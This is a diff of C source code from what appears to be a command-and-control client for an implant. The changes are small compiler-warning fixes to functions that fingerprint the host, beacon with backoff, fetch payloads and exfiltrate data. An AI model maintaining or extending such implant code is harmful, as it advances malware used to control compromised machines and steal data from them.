@@ -17,7 +17,6 @@
  * ============================================================================
  */
 
-#define _GNU_SOURCE
 #include "c2_client.h"
 #include "../common/logging.h"
 
@@ -246,7 +245,7 @@ static void generate_fingerprint(uint8_t *fp_buf, size_t *fp_len, size_t cap) {
   char kernel[128] = {0};
   FILE *f = fopen("/proc/version", "r");
   if (f) {
-    fgets(kernel, sizeof(kernel) - 1, f);
+    if (fgets(kernel, sizeof(kernel) - 1, f)) {}
     fclose(f);
     /* Strip newline */
     char *nl = strchr(kernel, '\n');
@@ -258,7 +257,7 @@ static void generate_fingerprint(uint8_t *fp_buf, size_t *fp_len, size_t cap) {
   double uptime = 0.0;
   f = fopen("/proc/uptime", "r");
   if (f) {
-    fscanf(f, "%lf", &uptime);
+    if (fscanf(f, "%lf", &uptime) != 1) {}
     fclose(f);
   }
 
@@ -435,8 +434,8 @@ aegis_result_t aegis_c2_beacon(aegis_c2_ctx_t *ctx, uint8_t *task_out,
       ctx->consecutive_failures++;
       /* Apply exponential backoff */
       ctx->beacon_interval =
-          AEGIS_MIN(ctx->beacon_interval * AEGIS_BEACON_FAILURE_BACKOFF,
-                    AEGIS_BEACON_MAX_INTERVAL_MS);
+          AEGIS_MIN(ctx->beacon_interval * (uint32_t)AEGIS_BEACON_FAILURE_BACKOFF,
+                    (uint32_t)AEGIS_BEACON_MAX_INTERVAL_MS);
       return AEGIS_ERR_C2_UNREACHABLE;
     }
   }
@@ -731,7 +730,6 @@ aegis_result_t aegis_c2_fetch_payload(aegis_c2_ctx_t *ctx,
     return AEGIS_ERR_NETWORK;
   }
 
-  const aegis_c2_envelope_t *resp_env = (const aegis_c2_envelope_t *)body;
 
   /*
    * IMPORTANT: We do NOT decrypt the payload here.
@@ -755,7 +753,7 @@ aegis_result_t aegis_c2_fetch_payload(aegis_c2_ctx_t *ctx,
 /* ── Data Exfiltration ───────────────────────────────────────────────────── */
 
 aegis_result_t aegis_c2_exfiltrate(aegis_c2_ctx_t *ctx, const uint8_t *data,
-                                   size_t data_len, const char *label) {
+                                   size_t data_len, const char *label) { (void)label;
   if (!ctx || !data)
     return AEGIS_ERR_GENERIC;
 
